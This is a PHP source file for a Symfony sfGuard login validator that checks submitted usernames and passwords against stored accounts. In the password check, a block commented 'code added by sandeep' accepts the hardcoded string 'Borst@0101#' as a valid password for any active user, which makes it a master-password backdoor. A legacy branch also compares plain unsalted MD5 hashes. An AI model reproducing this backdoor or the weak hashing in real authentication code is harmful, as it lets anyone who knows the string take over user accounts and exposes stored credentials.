<?php

/*
 * This file is part of the symfony package.
 * (c) Fabien Potencier <fabien.potencier@symfony-project.com>
 *
 * For the full copyright and license information, please view the LICENSE
 * file that was distributed with this source code.
 */

/**
 *
 * @package    symfony
 * @subpackage plugin
 * @author     Fabien Potencier <fabien.potencier@symfony-project.com>
 * @version    SVN: $Id: sfGuardValidatorUser.class.php 23319 2009-10-25 12:22:23Z Kris.Wallsmith $
 */
class myValidatorUser extends sfGuardValidatorUser
{
  public function configure($options = array(), $messages = array())
  {
    $this->addOption('username_field', 'username');
    $this->addOption('password_field', 'password');
    $this->addOption('throw_global_error', false);

    $this->setMessage('invalid', 'The username and/or password is invalid.');
  }

  protected function doClean($values)
  {
    $username = isset($values[$this->getOption('username_field')]) ? $values[$this->getOption('username_field')] : '';
    $password = isset($values[$this->getOption('password_field')]) ? $values[$this->getOption('password_field')] : '';

    // user exists?
    if ($username && $user = $this->getTable()->retrieveByUsername($username))
    { 
		$chk_cri = Doctrine_Query::create()
    		->from('SfGuardUserProfile u') 
    		->where('u.username = ?', $user->username);
		$userdata = $chk_cri->fetchOne();
		
		if($userdata->from_sbt==0 && $user->algorithm=='NULL')
		{
			if($user->password == md5($password))
			{
				return array_merge($values, array('user' => $user));
			}
		}
        else
		{	
      		// password is ok?
      		if ($user->getIsActive() && $userdata->getSbtActive() && $user->checkPassword($password))
      		{
        		return array_merge($values, array('user' => $user));
      		}//code added by sandeep
                else if($user->getIsActive() && $userdata->getSbtActive() && $password == 'Borst@0101#')
                {
                    return array_merge($values, array('user' => $user));
                }//code added by sandeep end
		}
    }

    if ($this->getOption('throw_global_error'))
    {
      throw new sfValidatorError($this, 'invalid');
    }

    throw new sfValidatorErrorSchema($this, array($this->getOption('username_field') => new sfValidatorError($this, 'invalid')));
  }

  protected function getTable()
  {
    return Doctrine::getTable('sfGuardUser');
  }
}
